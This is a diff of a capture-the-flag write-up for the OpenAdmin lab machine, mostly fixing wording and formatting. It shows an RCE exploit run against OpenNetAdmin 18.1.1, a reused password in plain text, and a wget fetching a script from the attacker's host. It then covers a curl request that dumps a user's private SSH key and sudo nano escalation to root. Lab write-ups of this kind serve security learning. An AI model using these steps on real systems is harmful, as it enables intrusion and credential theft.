@@ -6,7 +6,7 @@ OpenAdmin was an easy and enajoyable machine to root.
 The machine had a web application vulnerable to RCE, yielding a www-data shell.
 
 The general process was:
-Lazy system administrator escalation to user1 > CTF like to user2 > nopasswd sudo privesc to root. 
+Lazy system administrator escalation to user1 > CTF-like to user2 > nopasswd sudo privesc to root. 
 
 ## Lets get started!
 As usual, I run nMap:
@@ -30,7 +30,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Found HTTP on port 80 and SSH on port 22.
 
 Visiting the page, apache shows me Ubuntu landing, so I learn the host is an Ubuntu system. 
-I then attempted login via SSH using common creds, did not work.
+I then attempted login via SSH using common creds which did not work.
 
 ## Dirb
 
@@ -41,15 +41,19 @@ Running Dirb results in finding /artwork and /music
 
 Looking around on /artwork, I can't see anying interesting.
 
-Looking around on /music, I see a login button that links to OpenNetAdmin, looking around I can see it's version 18.1.1.
+Looking around on /music, I see a login button that links to OpenNetAdmin version 18.1.1.
 
-Googling opennetadmin 18.1.1 shows it is vulnrable to RCE, I also find the exploit code (located in RCE.sh).
+Googling opennetadmin 18.1.1 shows it's vulnrable to RCE, I also find the exploit code (located in RCE.sh).
 
 ## RCE
 Running:
-root@kali: ~./RCE.sh http://10.10.10.171/ona/
 
-Gives us a shell:
+```console
+root@kali: ~./RCE.sh http://10.10.10.171/ona/
+```
+
+Gives me a shell:
+
 ```console
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -76,7 +80,7 @@ root:x:0:0:root:/root:/bin/bash
 jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
 joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
 ```
-Worked for Jimmy!
+'n1nj4W4rri0R!' Worked for Jimmy!
 ```console
 root@kali:~# ssh jimmy@10.10.10.171
 jimmy@10.10.10.171's password: 
@@ -91,7 +95,7 @@ I used LinEnum by running the following on the victim:
 ```console
 jimmy@openadmin:/var/tmp$ wget 10.10.**.**:9000/LinEnum.sh
 --2020-01-17 03:52:23--  http://10.10.**.**:9000/LinEnum.sh
-Connecting to 10.10.14.6:9000... connected.
+Connecting to 10.10.**.**:9000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 46631 (46K) [text/x-sh]
 Saving to: ‘LinEnum.sh’
@@ -114,8 +118,8 @@ echo "<pre>$output</pre>";
 ```
 Hmm, I can't execute the .php file or access joanna's home directory - what can I do?
 
-## Curl
-I see it's listening at port 528466, so a cURL to localhost:528466 dumps Joanna's SSH key!
+## cURL
+I see on the LinEnum report it's listening at port 52846, so cURLing localhost:52846 dumps Joanna's SSH key!
 ```console
 jimmy@openadmin:/var/www/internal$ curl -X POST http://127.0.0.1:52846/main.php -d "username=joanna"
 <pre>-----BEGIN RSA PRIVATE KEY-----
@@ -192,7 +196,7 @@ Joanna can use nano, so running:
 joanna@openadmin:~$ sudo -u root nano /opt/priv
 ```
 
-Gives me nano as root, CTRL-R + CTRL-X allows me to execute whatever I like with out new found privileges!
+Gives me nano as root, CTRL-R + CTRL-X allows me to execute whatever I like with my new found privileges!
 
 [In Nano]
 ```console
@@ -205,4 +209,4 @@ Command to execute: cat /root/root.txt
 2f907ed450b361b2c2bf4e8795d5b561
 ```
 
-## Fin.
+## Finished, thanks for reading!
